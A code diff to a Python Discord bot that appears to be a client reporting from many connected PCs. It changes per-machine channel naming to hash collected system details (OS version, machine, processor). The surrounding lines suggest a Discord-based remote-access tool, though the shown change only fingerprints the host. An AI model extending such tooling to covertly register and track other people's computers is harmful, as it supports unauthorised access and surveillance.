@@ -36,7 +36,8 @@ bot.connected_pc_count = 0
 async def on_ready():
     print(f'We have logged in as {bot.user.name}')
 
-    hash_object = hashlib.md5(bot.user.name.encode())
+    system_info = get_system_info()  # Function to get system information
+    hash_object = hashlib.md5(system_info.encode())
     channel_name = hash_object.hexdigest()[:7]
     guild = bot.guilds[0]
 
@@ -55,6 +56,15 @@ async def on_ready():
         print(f'Error sending system information: {e}')
 
     await update_presence()
+
+# Add a function to get system information
+
+
+def get_system_info():
+    system_info = f"System: {platform.system()} {platform.version()}\n"
+    system_info += f"Machine: {platform.machine()}\n"
+    system_info += f"Processor: {platform.processor()}"
+    return system_info
 
 
 @bot.event
